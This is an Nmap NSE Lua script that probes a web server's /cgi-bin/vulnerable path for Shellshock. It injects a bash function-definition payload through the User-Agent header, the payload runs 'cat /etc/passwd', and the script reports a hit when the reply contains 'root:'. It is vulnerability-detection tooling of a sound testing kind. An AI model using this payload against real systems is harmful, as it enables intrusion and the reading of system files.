local http = require "http"
local shortport = require "shortport"

portrule = shortport.http

action = function(host, port)
    local payload = "() { :; }; echo; /bin/bash -c 'cat /etc/passwd'" 
    local response = http.get(host, port, "/cgi-bin/vulnerable", { header = { ["User-Agent"] = payload } })
    if response and response.body and response.body:match("root:") then
        return "Shellshock vulnerability DETECTED!"
    end
    return "Shellshock vulnerability NOT FOUND!"
end